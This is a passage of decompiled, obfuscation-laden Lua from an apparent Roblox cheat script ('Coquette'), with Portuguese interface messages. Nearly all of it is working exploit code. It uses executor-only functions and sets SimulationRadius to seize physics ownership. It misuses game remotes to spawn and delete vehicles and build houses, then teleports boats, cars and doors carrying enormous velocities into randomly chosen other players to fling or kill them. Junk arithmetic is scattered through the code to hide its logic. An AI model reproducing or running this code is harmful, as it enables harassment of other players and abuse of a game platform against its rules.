	local n6 = bit32.band(22397 * v4[1] + bit32.lshift(bit32.band(22397 * bit32.rshift(v3[1], 16) + 30357 * v4[1], 65535), 16), 4294967295) + 484207416
	local v5 = table.pack(bit32.band(bit32.bor(n2, 522562968), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(20742 * v6[1] + bit32.lshift(bit32.band(20742 * bit32.rshift(v5[1], 16) + 4821 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(n2, 522562968), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n7 = n6 + v7 + bit32.band(22398 * v9[1] + bit32.lshift(bit32.band(22398 * bit32.rshift(v8[1], 16) + 30357 * v9[1], 65535), 16), 4294967295)
	genv.CoquetteBoatAllActive = false
	getgenv().CoquetteKillBusAllActive = false
	local v10 = upv8
	local v11 = bit32.bxor(n7, 114250975)
	v10.carRemote("DeleteAllVehicles")

	pcall(function()
		upv9:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("PlayerWantsToDeleteTool", "Couch")
	end)

	local character = upv10.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	character = character and character:FindFirstChildOfClass("Humanoid")

	if humanoidRootPart and upv11 then
		humanoidRootPart.Anchored = true
		humanoidRootPart.CFrame = upv11
		humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
		local n8 = v2 // 2
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		humanoidRootPart.Anchored = false

		if character then
			character:ChangeState(Enum.HumanoidStateType.GettingUp)
		end
	end

	upv12 = nil
	upv11 = nil
end

-- payload closure created 762-th (proto #503)
local function payload_fn_762()
	local n2 = 4078337864
	local n3 = 118999418
	if not upv1 then
		return false
	end
	local character = upv2.Character
	character = character and character:FindFirstChild("HumanoidRootPart")
	if not character then
		return false
	end
	upv3 = character.CFrame
	local v = bit32.bxor(n3, n2)

	if upv4 == "All" then
		local coquetteAllActions = getgenv().CoquetteAllActions
		if not coquetteAllActions then
			return false
		end

		if upv1 == "Bola (Fling)" and coquetteAllActions.ToggleBall then
			coquetteAllActions.ToggleBall()
		elseif upv1 == "Barco (fling)" and coquetteAllActions.FlingBoat then
			coquetteAllActions.FlingBoat(true)
		else
			local flag = upv5 == "Matar"

			if flag then
				flag = upv1 == "Ônibus"
				n2 = bit32.bxor(bit32.bxor(n2, 1874507133), 1874507133)
			end

			if flag and coquetteAllActions.KillBus then
				coquetteAllActions.KillBus(true)
			elseif upv5 == "Matar" and upv1 == "Gyrosphere" and coquetteAllActions.KillGyro then
				coquetteAllActions.KillGyro(true)
			elseif upv5 == "Puxar" and upv1 == "Gyrosphere" and coquetteAllActions.BringGyro then
				coquetteAllActions.BringGyro(true)
			else
				local flag2 = upv5 == "Matar"

				if flag2 then
					flag2 = upv1 == "Sofá"
					bit32.bxor(bit32.bxor(n2, 4294967295), 4294967295)
				end

				if flag2 and coquetteAllActions.KillCouch then
					coquetteAllActions.KillCouch(true)
				elseif upv5 == "Puxar" and upv1 == "Ônibus" and coquetteAllActions.BringBus then
					coquetteAllActions.BringBus(true)
				else
					if not (upv5 == "Puxar" and upv1 == "Sofá" and coquetteAllActions.BringCouch) then
						return false
					end
					coquetteAllActions.BringCouch(true)
				end
			end
		end

		return true
	end

	if not upv6 then
		return false
	end
	local flag = upv5 == "Matar"

	if flag then
		flag = upv1 == "Sofá"
	end

	if flag then
		upv7(upv6)
	elseif upv5 == "Matar" and upv1 == "Ônibus" then
		upv8(upv6, false)
	elseif upv5 == "Puxar" and upv1 == "Sofá" then
		upv9(upv6)
	elseif upv5 == "Puxar" and upv1 == "Ônibus" then
		upv8(upv6, true)
	elseif upv5 == "Matar" and upv1 == "Gyrosphere" then
		upv8(upv6, false, "gyro")
	else
		if not (upv5 == "Puxar" and upv1 == "Gyrosphere") then
			return false
		end
		upv8(upv6, true, "gyro")
	end

	return true
end

-- payload closure created 763-th (proto #502)
local function payload_fn_763(arg)
	upv1 += 1
	local v = upv1

	if arg then
		if not upv2() then
			local n2 = 347859805

			task.defer(function()
				upv3:Set(false)
			end)
		elseif upv4 == "Player" then
			local n2 = 295767887

			task.spawn(function()
				task.wait(0.1)

				while v == upv1 and (upv5 or upv6 or upv7) do
					task.wait(0.05)
				end

				task.wait(0.9)

				if v == upv1 and not upv5 and not upv6 and not upv7 then
					upv3:Set(false)
				end
			end)
		end
	else
		upv8()
	end
end

-- payload closure created 768-th (proto #t424)
local function payload_fn_768(arg)
	local tbl = {}
	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist or {}
	local position = upv1 and upv1.Position

	for _, player in ipairs(upv2:GetPlayers()) do
		if player ~= upv3 and not table.find(coquetteAllWhitelist, player) then
			local character = player.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			character = character and character:FindFirstChildOfClass("Humanoid")

			if humanoidRootPart and character and character.Health > 0 and not character.Sit and (not arg or not position or not humanoidRootPart or (humanoidRootPart.Position - position).Magnitude > 25) then
				table.insert(tbl, player)
			end
		end
	end

	for i = #tbl, 2, -1 do
		local n2 = math.random(i)
		local v = tbl[i]
		tbl[i] = tbl[n2]
		tbl[n2] = v
	end

	return tbl
end

-- payload closure created 769-th (proto #t3572)
local function payload_fn_769(arg, arg2)
	local n2 = 4045655166
	local v = upv1

	while true do
		if upv2 and arg2 == upv3 then
			local v2 = upv4(arg)

			if #v2 == 0 then
				if not arg then
					task.wait(1)
					continue
				end
			else
				for _, v3 in ipairs(v2) do
					if not (not upv2 or arg2 ~= upv3) then
						if v3.Parent == upv5 then
							upv1 = v3
							local humanoidRootPart = upv6.Character and upv6.Character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart and upv7 then
								humanoidRootPart.CFrame = upv7
								humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
								humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
							end

							if arg then
								upv8(v3)
							else
								upv9(v3)
							end

							local now = os.clock()

							while upv2 and arg2 == upv3 and (upv10 or upv11) and os.clock() - now < 11 do
								task.wait(0.05)
							end

							if os.clock() - now >= 11 then
								upv10 = false
								upv11 = false
								upv12 = nil
								upv13 = nil
								upv14(false)
							end

							local humanoid = v3.Character and v3.Character:FindFirstChildOfClass("Humanoid")
							task.wait(humanoid and humanoid.Sit and 0.9 or 0.15)
						end

						continue
					end

					break
				end

				continue
			end
		end

		break
	end

	if arg2 == upv3 then
		upv2 = false
		upv1 = v

		if arg and upv15 then
			local n3 = 232281040

			task.defer(function()
				upv15:Set(false)
			end)
		end
	end
end

-- payload closure created 770-th (proto #t5640)
local function payload_fn_770(arg)
	upv1 += 1
	upv2 = arg

	if arg then
		task.spawn(upv3, false, upv1)
	else
		upv4 = false
		upv5 = nil
		upv6 = nil
		upv7(false)
	end
end

-- payload closure created 771-th (proto #t982)
local function payload_fn_771(arg)
	upv1 += 1
	upv2 = arg

	if arg then
		task.spawn(upv3, true, upv1)
	else
		upv4 = false
		upv5 = nil
		upv6 = nil
		upv7(false)
	end
end

-- payload closure created 772-th (proto #t4640)
local function payload_fn_772(arg)
	local tbl = {}
	local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist or {}
	local position = upv1 and upv1.Position

	for _, player in ipairs(upv2:GetPlayers()) do
		if player ~= upv3 and not table.find(coquetteAllWhitelist, player) then
			local character = player.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			character = character and character:FindFirstChildOfClass("Humanoid")

			if humanoidRootPart and character and character.Health > 0 and not character.Sit and (not arg or not position or not humanoidRootPart or (humanoidRootPart.Position - position).Magnitude > 25) then
				table.insert(tbl, player)
			end
		end
	end

	for i = #tbl, 2, -1 do
		local n2 = math.random(i)
		local v = tbl[i]
		tbl[i] = tbl[n2]
		tbl[n2] = v
	end

	return tbl
end

-- payload closure created 773-th (proto #t1590)
local function payload_fn_773(arg, arg2, arg3)
	local v = upv1

	while true do
		if upv2 and arg2 == upv3 then
			local v2 = upv4(arg)

			if #v2 == 0 then
				if not arg then
					task.wait(1)
					continue
				end
			else
				for _, v3 in ipairs(v2) do
					if not (not upv2 or arg2 ~= upv3) then
						if v3.Parent == upv5 then
							upv1 = v3
							local humanoidRootPart = upv6.Character and upv6.Character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart and upv7 then
								humanoidRootPart.CFrame = upv7
								humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
								humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
							end

							local now = os.clock()
							upv8(v3, arg, arg3)

							while upv2 and arg2 == upv3 and upv9 and os.clock() - now < 15 do
								task.wait(0.05)
							end

							if os.clock() - now >= 15 then
								local n2 = 94622881
								upv9 = false

								if upv10 then
									upv10:Disconnect()
									upv10 = nil
								end

								local v4 = bit32.bxor(n2, 329028840)
								flingConnection:Disconnect()
								flingConnection = nil

								pcall(function()
									upv11:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("DeleteAllVehicles")
								end)
							end

							task.wait(1)
						end

						continue
					end

					break
				end

				continue
			end
		end

		break
	end

	if arg2 == upv3 then
		upv2 = false
		upv1 = v

		if arg and upv12 then
			local n2 = 463575135

			task.defer(function()
				upv12:Set(false)
			end)
		end
	end
end

-- payload closure created 774-th (proto #510)
local function payload_fn_774(arg, arg2)
	return function(arg3)
		upv1 += 1
		upv2 = arg3

		if arg3 then
			task.spawn(upv3, arg, upv1, arg2)
		else
			upv4 = false

			if upv5 then
				upv5:Disconnect()
				upv5 = nil
			end

			flingConnection:Disconnect()
			flingConnection = nil
		end
	end
end

-- payload closure created 776-th (proto #t8722)
local function payload_fn_776(arg)
	local n2 = 2222683870
	local n3 = 2049315470
	local v = upv1
	local character = upv2.Character
	local n4 = 8662748742
	local v2 = bit32.bxor(1877869783, n3)
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	character = character and character:FindFirstChildOfClass("Humanoid")
	local vehicles = upv3:FindFirstChild("Vehicles")
	if not humanoidRootPart or not character or not vehicles then
		return
	end

	pcall(function()
		upv4:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("DeleteAllVehicles")
	end)

	local str = upv2.Name .. "Car"
	local now = tick()

	while vehicles:FindFirstChild(str) and tick() - now < 3 do
		task.wait(0.05)
	end

	local v3 = nil

	for i = 1, 3 do
		local n5 = 157157588
		if not upv5 or arg ~= upv6 then
			return
		end
		local n6 = n5 + 182755666
		humanoidRootPart.CFrame = CFrame.new(1565.3707, -3.7332, 50.6853)
		humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
		humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		task.wait(0.35)

		pcall(function()
			upv4:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("PickingBoat", "PirateFree")
		end)

		local now2 = tick()

		while upv5 and arg == upv6 and not v3 and tick() - now2 < 3 do
			task.wait(0.1)
			v3 = vehicles:FindFirstChild(str)
		end

		if v3 then
			break
		end
	end

	if not v3 then
		upv5 = false

		if upv7 then
			task.defer(function()
				upv7:Set(false)
			end)
		end

		return
	end

	local function fn()
		local body = v3:FindFirstChild("Body")

		if body then
			body = body:FindFirstChild("VehicleSeat") or body:FindFirstChildWhichIsA("VehicleSeat", true)
		end

		return body or v3:FindFirstChild("VehicleSeat", true) or v3:FindFirstChildWhichIsA("VehicleSeat", true) or v3:FindFirstChildWhichIsA("Seat", true)
	end

	local v4 = fn(152198194, 472723890)
	local now2 = tick()

	while upv5 and arg == upv6 and v3.Parent and not v4 and tick() - now2 < 6 do
		task.wait(0.1)
		v4 = fn(343784574, 472723890)
	end

	local now3 = tick()

	while upv5 and arg == upv6 and v4 and not character.Sit and tick() - now3 < 5 do
		humanoidRootPart.CFrame = v4.CFrame
		task.wait(0.05)
	end

	if not character.Sit then
		upv5 = false

		if upv7 then
			local defer = task.defer
			local v5 = bit32.bxor(n3, 4294967295)

			defer(function()
				upv7:Set(false)
			end)

		end

		return
	end

	for _, descendant in ipairs(v3:GetDescendants()) do
		if descendant:IsA("BasePart") then
			descendant.CanCollide = false

			pcall(function()
				descendant:SetNetworkOwner(nil)
			end)

			local bodyVelocity = Instance.new("BodyVelocity")
			bodyVelocity.Name = "CoquetteBoatAllVelocity"
			bodyVelocity.Velocity = Vector3.new(1e9, 1e9, 1e9)
			bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.P = 1e9
			bodyVelocity.Parent = descendant
		end
	end

	upv8 = true

	if upv9 then
		upv9:Disconnect()
	end

	local stepped = upv10.Stepped
	local connect = stepped.Connect

	local function fn2()
		if not upv5 or arg ~= upv6 then
			return
		end
		local character2 = upv2.Character
		local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
		local v5 = ipairs
		local descendants = character2 and character2:GetDescendants() or {}

		for _, descendant in v5(descendants) do
			if descendant:IsA("BasePart") then
				descendant.CanCollide = false
			end
		end

		if humanoidRootPart2 then
			humanoidRootPart2.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart2.AssemblyAngularVelocity = Vector3.zero
		end
	end

	upv9 = connect(stepped, fn2)

	while upv5 and arg == upv6 and v3.Parent do
		local coquetteAllWhitelist = getgenv().CoquetteAllWhitelist or {}
		local tbl = {}

		for _, player in ipairs(upv11:GetPlayers()) do
			if player ~= upv2 and not table.find(coquetteAllWhitelist, player) then
				local character2 = player.Character
				local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
				character2 = character2 and character2:FindFirstChildOfClass("Humanoid")
				local position = upv12 and upv12.Position

				if humanoidRootPart2 and character2 and character2.Health > 0 and humanoidRootPart2 and (not position or (humanoidRootPart2.Position - position).Magnitude < 2000) then
					table.insert(tbl, player)
				end
			end
		end

		for i = #tbl, 2, -1 do
			local n5 = math.random(i)
			local v5 = tbl[i]
			tbl[i] = tbl[n5]
			tbl[n5] = v5
		end

		if #tbl == 0 then
			task.wait(1)
		else
			for _, v5 in ipairs(tbl) do
				if not (not upv5 or arg ~= upv6 or not v3.Parent) then
					upv1 = v5
					local character2 = v5.Character
					local humanoidRootPart2 = character2 and character2:FindFirstChild("HumanoidRootPart")
					character2 = character2 and character2:FindFirstChildOfClass("Humanoid")

					if humanoidRootPart2 and character2 and character2.Health > 0 then
						local now4 = tick()
						local position = humanoidRootPart2.Position
						local flag = true

						while true do
							if upv5 and arg == upv6 and v3.Parent and v5.Parent == upv11 and tick() - now4 < 5 then
								local character3 = v5.Character
								local humanoidRootPart3 = character3 and character3:FindFirstChild("HumanoidRootPart")
								character3 = character3 and character3:FindFirstChildOfClass("Humanoid")

								if not (not humanoidRootPart3 or not character3 or character3.Health <= 0) then
									local assemblyLinearVelocity = humanoidRootPart3.AssemblyLinearVelocity

									if not (assemblyLinearVelocity.Magnitude > 120 or assemblyLinearVelocity.Y > 55 or (humanoidRootPart3.Position - position).Magnitude > 35) then
										local n5 = flag and 9 or -9
										flag = not flag
										local n6 = humanoidRootPart3.Position + humanoidRootPart3.CFrame.LookVector * n5 + Vector3.new(0, -4.5, 0)

										pcall(function()
											local cframe = CFrame.Angles
											local rad = math.rad
											local random = math.random
											v3:PivotTo(CFrame.new(n6) * cframe(math.rad(math.random(-25, 25)), math.rad(math.random(0, 360)), rad(random(-25, 25))))
										end)

										upv10.Heartbeat:Wait()
										continue
									end
								end
							end

							break
						end
					end

					if upv5 and arg == upv6 then
						task.wait(0.05)
					end

					continue
				end

				break
			end
		end
	end

	if arg == upv6 then
		upv5 = false
		upv8 = false

		if upv9 then
			upv9:Disconnect()
			upv9 = nil
		end

		upv1 = v

		if upv7 then
			task.defer(function()
				upv7:Set(false)
			end)
		end
	end
end

-- payload closure created 777-th (proto #t6469)
local function payload_fn_777(coquetteBoatAllActive)
	local n2 = 2643366307
	local n3 = 3375073100
	local n4 = 3023769746
	local flag = upv1 or upv2 ~= nil or getgenv().CoquetteBoatAllActive == true
	upv3 += 1
	upv1 = coquetteBoatAllActive
	local str = "CoquetteBoatAllActive"
	getgenv().CoquetteBoatAllActive = coquetteBoatAllActive
	local flag2 = not coquetteBoatAllActive

	if flag2 then
		flag2 = not flag
		n2 = n3
	end

	if flag2 then
		return
	end

	if coquetteBoatAllActive then
		task.spawn(upv4, upv3)
	else
		local n5 = 257180942
		upv5 = false

		if upv2 then
			upv2:Disconnect()
			upv2 = nil
		end

		if upv6 then
			upv6:Disconnect()
			upv6 = nil
		end

		local v = bit32.bor(n4, 143216352)
		flingConnection:Disconnect()
		flingConnection = nil
		local character = upv7.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		local humanoid = character and character:FindFirstChildOfClass("Humanoid")

		if humanoidRootPart then
			humanoidRootPart.Anchored = true
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
		end

		local v2 = pcall
		local v3 = table.pack(bit32.band(n5, 4294967295))
		local v4 = table.pack(bit32.band(v3[1], 65535))
		local n6 = bit32.band(47622 * v4[1] + bit32.lshift(bit32.band(47622 * bit32.rshift(v3[1], 16) + 48477 * v4[1], 65535), 16), 4294967295) + 3249901056
		local v5 = table.pack(bit32.band(bit32.bor(n5, 521530624), 4294967295))
		local v6 = table.pack(bit32.band(v5[1], 65535))
		local v7 = bit32.band(35828 * v6[1] + bit32.lshift(bit32.band(35828 * bit32.rshift(v5[1], 16) + 34116 * v6[1], 65535), 16), 4294967295)
		local v8 = table.pack(bit32.band(bit32.bxor(n5, 521530624), 4294967295))
		local v9 = table.pack(bit32.band(v8[1], 65535))
		local n7 = n6 + v7 + bit32.band(47623 * v9[1] + bit32.lshift(bit32.band(47623 * bit32.rshift(v8[1], 16) + 48477 * v9[1], 65535), 16), 4294967295)

		v2(function()
			upv8:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer("DeleteAllVehicles")
		end)

		task.wait(0.3)

		if character then
			for _, descendant in ipairs(character:GetDescendants()) do
				if descendant:IsA("BasePart") then
					descendant.AssemblyLinearVelocity = Vector3.zero
					descendant.AssemblyAngularVelocity = Vector3.zero

					if descendant.Name == "Head" or descendant.Name == "Torso" or descendant.Name == "UpperTorso" or descendant.Name == "LowerTorso" then
						descendant.CanCollide = true
					else
						descendant.CanCollide = false
					end
				end
			end
		end

		if humanoid then
			humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			humanoid.Sit = false
			humanoid.PlatformStand = false
		end

		if humanoidRootPart and upv9 then
			humanoidRootPart.CFrame = upv9 + Vector3.new(0, 5, 0)
			humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
			humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
			task.wait(0.25)
			humanoidRootPart.Anchored = false

			if humanoid then
				humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
			end
		elseif humanoidRootPart then
			humanoidRootPart.Anchored = false
		end

	end
end

-- payload closure created 778-th (proto #511)
local function payload_fn_778(arg)
	upv1 = arg
end

-- payload closure created 779-th (proto #t3617)
local function payload_fn_779(arg, arg2)
	local n2 = 768600272

	pcall(function()
		local StarterGui = game:GetService("StarterGui")
		local setCore = StarterGui.SetCore
		setCore(StarterGui, "SendNotification", { Title = "Fling Part", Text = arg, Duration = arg2 or 3 })
	end)
end

-- payload closure created 780-th (proto #t4978)
local function payload_fn_780(arg)
	local ok2, result2 = pcall(isnetworkowner, arg)
	if ok2 then
		return result2
	end
	return arg.ReceiveAge == 0
end

-- payload closure created 781-th (proto #t5234)
local function payload_fn_781()
	local n001Lots = workspace:FindFirstChild("001_Lots")
	return n001Lots and n001Lots:FindFirstChild(game.Players.LocalPlayer.Name .. "House")
end

-- payload closure created 782-th (proto #t1644)
local function payload_fn_782(arg)
	for _, descendant in ipairs(arg:GetDescendants()) do
		if descendant:IsA("ValueBase") and descendant.Name == "Number" and tonumber(descendant.Value) then
			return tonumber(descendant.Value)
		end
	end

	return nil
end

-- payload closure created 783-th (proto #t8677)
local function payload_fn_783()
	local v = upv1()
	if not v then
		return nil, false
	end
	local v2 = nil

	for _, descendant in ipairs(v:GetDescendants()) do
		if descendant.Name == "Door" and descendant:IsA("BasePart") and not descendant.Anchored and descendant.Parent and descendant.Parent.Name == "NoLockHouseDoor" then
			if not descendant.Parent:FindFirstChild("Hinge") and not descendant.Parent:FindFirstChildWhichIsA("HingeConstraint", true) then
				return descendant, true
			end
			v2 = v2 or descendant
		end
	end

	return v2, false
end

-- payload closure created 784-th (proto #t3581)
local function payload_fn_784(arg)
	if not arg or not arg:IsDescendantOf(workspace) then
		return false
	end
	local position = arg.Position
	return position == position and position.Magnitude < 100000
end

-- payload closure created 785-th (proto #t4613)
local function payload_fn_785(arg)
	local n2 = 747139701

	local ok2, result2 = pcall(function()
		return upv1:WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):InvokeServer(arg, getgenv().DoorFlingHouseId, { row = getgenv().DoorFlingHouseGrid.row, column = getgenv().DoorFlingHouseGrid.column })
	end)

	if not (ok2 and result2) then
		upv2("O jogo não deixou montar a casa agora (espera de 10 min entre casas).", 5)
		return false
	end
	return true
end

-- payload closure created 786-th (proto #t4960)
local function payload_fn_786()
	local n2 = 4221486916
	local n3 = 2982095402
	local v, v2 = upv1()
	if v and v2 then
		return v
	end
	local localPlayer = game.Players.LocalPlayer
	local humanoidRootPart = localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
	local n001Lots = workspace:FindFirstChild("001_Lots")
	if not n001Lots then
		return v
	end
	local v3 = upv2()
	local value = v3 and upv3(v3)

	if not v3 then
		local v4 = nil

		for _, child in pairs(n001Lots:GetChildren()) do
			local v5

			if child.Name == "For Sale" and not child:FindFirstChild("HousePickedByPlayer") then
				for _, descendant in pairs(child:GetDescendants()) do
					if descendant:IsA("NumberValue") and descendant.Name == "Number" and descendant.Value >= 11 and descendant.Value <= 24 then
						value = descendant.Value
						v4 = child
						break
					end
				end

				v5 = v4
			else
				v5 = v4
			end

			if v5 then
				v4 = v5
				break
			else
				v4 = v5
			end
		end

		if not v4 then
			return v
		end
		local buyHouse = v4:FindFirstChild("BuyHouse")

		if buyHouse and buyHouse:IsA("BasePart") and humanoidRootPart then
			local cFrame = humanoidRootPart.CFrame
			local v5 = bit32.bor(n3, n2)
			humanoidRootPart.CFrame = buyHouse.CFrame + Vector3.new(0, -6, 0)
			task.wait(0.5)
			local clickDetector = buyHouse:FindFirstChild("ClickDetector")

			if clickDetector and fireclickdetector then
				local n4 = 499178066

				pcall(function()
					fireclickdetector(clickDetector)
				end)
			end

			task.wait(0.5)
			humanoidRootPart.CFrame = cFrame
			n3 = v5 + 3053402812
		end
	end

	if not value then
		return v
	end
	upv4("Montando a casa do Fling Part...")
	if not upv5(value) then
		return v
	end
	local now = tick()
	local v4

	while true do
		task.wait(0.25)
		local v5
		v4, v5 = upv1()
		if not (v4 and v5 or tick() - now > 12) then
			continue
		end
		break
	end

	return v4
end

-- payload closure created 787-th (proto #t8668)
local function payload_fn_787(parent)
	local v = upv1[parent]
	local n2 = 359523112
	local tbl = v or { joints = {}, movers = {} }
	upv1[parent] = tbl
	local v2 = pcall
	local v3 = table.pack(bit32.band(n2, 4294967295))
	local v4 = table.pack(bit32.band(v3[1], 65535))
	local n3 = bit32.band(17188 * v4[1] + bit32.lshift(bit32.band(17188 * bit32.rshift(v3[1], 16) + 59909 * v4[1], 65535), 16), 4294967295) + 482223216
	local v5 = table.pack(bit32.band(bit32.bor(n2, 286444092), 4294967295))
	local v6 = table.pack(bit32.band(v5[1], 65535))
	local v7 = bit32.band(31160 * v6[1] + bit32.lshift(bit32.band(31160 * bit32.rshift(v5[1], 16) + 11253 * v6[1], 65535), 16), 4294967295)
	local v8 = table.pack(bit32.band(bit32.bxor(n2, 286444092), 4294967295))
	local v9 = table.pack(bit32.band(v8[1], 65535))
	local n4 = n3 + v7 + bit32.band(17189 * v9[1] + bit32.lshift(bit32.band(17189 * bit32.rshift(v8[1], 16) + 59909 * v9[1], 65535), 16), 4294967295)

	v2(function()
		parent.CanCollide = false
		parent.Massless = true
		parent.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

		for _, child in ipairs(parent:GetChildren()) do
			if child.Name == "CoquetteDoorFlingBV" then
				child:Destroy()
			elseif child:IsA("BodyMover") then
				table.insert(tbl.movers, child)
				child.Parent = nil
			end
		end

		for _, v10 in ipairs(parent:GetJoints()) do
			if v10.Enabled then
				table.insert(tbl.joints, v10)
				v10.Enabled = false
			end
		end
	end)

	local bodyVelocity = Instance.new("BodyVelocity")
	bodyVelocity.Name = "CoquetteDoorFlingBV"
	bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
	bodyVelocity.P = 1e10
	bodyVelocity.Velocity = Vector3.zero
	bodyVelocity.Parent = parent
	return bodyVelocity
end

-- payload closure created 788-th (proto #t7803)
local function payload_fn_788(parent, cFrame)
	local flag = not parent
	local n2 = 9117659565
	if flag or not parent.Parent then
		return
	end
	local v = pcall
	local v2 = bit32.bxor(n2, 493249771)

	v(function()
		local n3 = 2375490366
		local v3 = bit32.bxor(v2, 1982416029)
		local n4 = 1763326761

		for _, child in ipairs(parent:GetChildren()) do
			if child.Name == "CoquetteDoorFlingBV" then
				child:Destroy()
			end
		end

		parent.AssemblyLinearVelocity = Vector3.zero
		local n5 = n4 // v3
		parent.AssemblyAngularVelocity = Vector3.zero
		parent.CanCollide = true
		local v4 = upv1[parent]

		if v4 and #v4.joints > 0 then
			if cFrame then
				parent.CFrame = cFrame
			end

			for _, joint in ipairs(v4.joints) do
				local n6 = 168308529

				pcall(function()
					joint.Enabled = true
				end)
			end
		else
			local raycastParams = RaycastParams.new()
			local n6 = bit32.rshift(v3, 22)
			raycastParams.FilterType = Enum.RaycastFilterType.Exclude
			raycastParams.FilterDescendantsInstances = { parent, game.Players.LocalPlayer.Character }
			local hit = workspace:Raycast((cFrame and cFrame.Position or parent.Position) + Vector3.new(0, 5, 0), Vector3.new(0, -300, 0), raycastParams)

			if not hit then
				local character = game.Players.LocalPlayer.Character
				local humanoidRootPart

				if character then
					local v5 = game
					humanoidRootPart = v5.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				else
					humanoidRootPart = character
				end

				if humanoidRootPart then
					hit = workspace:Raycast(humanoidRootPart.Position + Vector3.new(4, 0, 0), Vector3.new(0, -50, 0), raycastParams)
				end
			end

			if hit then
				parent.CFrame = CFrame.new(hit.Position + Vector3.new(0, parent.Size.Y / 2 + 0.5, 0))
				n6 = n6 // 16 - 4294966861
			elseif cFrame then
				parent.CFrame = cFrame
			end
		end

		if v4 then
			local v5, v6, v7 = ipairs(v4.movers)

			for _, v8 in v5, v6, v7 do
				bit32.bxor(bit32.bxor(v2, 0), 499666514)
				local n6 = 429673422

				pcall(function()
					v8.Parent = parent
				end)
			end

			upv1[parent] = nil
		end
	end)
end

-- payload closure created 789-th (proto #t49)
local function payload_fn_789(arg, arg2)
	if upv1(arg) then
		return true
	end
	local flag = not upv2(arg) or not arg2
	if flag then
		return false
	end
	local now = tick()

	while true do
		local n2 = 309289828

		if type(flag) == "vector" then
		end

		local v = pcall
		local v2 = table.pack(bit32.band(n2, 4294967295))
		local v3 = table.pack(bit32.band(v2[1], 65535))
		local n3 = bit32.band(12324 * v3[1] + bit32.lshift(bit32.band(12324 * bit32.rshift(v2[1], 16) + 6793 * v3[1], 65535), 16), 4294967295) + 365642408
		local v4 = table.pack(bit32.band(bit32.bor(n2, 502516186), 4294967295))
		local v5 = table.pack(bit32.band(v4[1], 65535))
		local v6 = bit32.band(40888 * v5[1] + bit32.lshift(bit32.band(40888 * bit32.rshift(v4[1], 16) + 51949 * v5[1], 65535), 16), 4294967295)
		local v7 = table.pack(bit32.band(bit32.bxor(n2, 502516186), 4294967295))
		local v8 = table.pack(bit32.band(v7[1], 65535))
		local n4 = n3 + v6 + bit32.band(12325 * v8[1] + bit32.lshift(bit32.band(12325 * bit32.rshift(v7[1], 16) + 6793 * v8[1], 65535), 16), 4294967295)

		v(function()
			arg2.CFrame = CFrame.new(arg.Position + Vector3.new(0, 3, 0))
			arg2.AssemblyLinearVelocity = Vector3.zero
		end)

		task.wait(0.05)
		local flag2 = upv1(arg) or tick() - now > 3
		if not flag2 then
			continue
		end
		break
	end

	return upv1(arg)
end

-- payload closure created 790-th (proto #t8659)
local function payload_fn_790()
	local v, v2 = upv1()
	if upv2(v) and v2 then
		return v
	end
	local v3 = upv3()
	v3 = v3 and upv4(v3)
	if not v3 or not upv5(v3) then
		return nil
	end
	local now = tick()
	local v4

	while true do
		task.wait(0.25)
		local v5
		v4, v5 = upv1()
		if not (upv2(v4) and v5 or tick() - now > 12) then
			continue
		end
		break
	end

	return upv2(v4) and v4 or nil
end

-- payload closure created 791-th (proto #t9400)
local function payload_fn_791(arg)
	local n2 = 2598332294
	local n3 = 2343848803
	local n4 = 999354352
	local flag = not arg
	local n5 = 291650231

	if not flag then
		flag = not arg.Character
		n3 = n3 - 3803735024 - 491232272
	end

	if flag then
		return
	end
	local localPlayer = game.Players.LocalPlayer
	local character = localPlayer.Character
	local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
	local n6 = n5 + 354685055
	if not humanoidRootPart then
		return
	end
	local cFrame = humanoidRootPart.CFrame
	local v = upv1()
	if not upv2(v) then
		upv3("Não foi possível iniciar o fling pois a casa não possui a parte necessária ou demorou muito para carregar.", 5)
		return
	end

	pcall(function()
		sethiddenproperty(localPlayer, "SimulationRadius", math.huge)
		sethiddenproperty(localPlayer, "MaxSimulationRadius", math.huge)
	end)

	upv4(v, humanoidRootPart)
	local doorFlingSessao = (getgenv().DoorFlingSessao or 0) + 1
	getgenv().DoorFlingSessao = doorFlingSessao
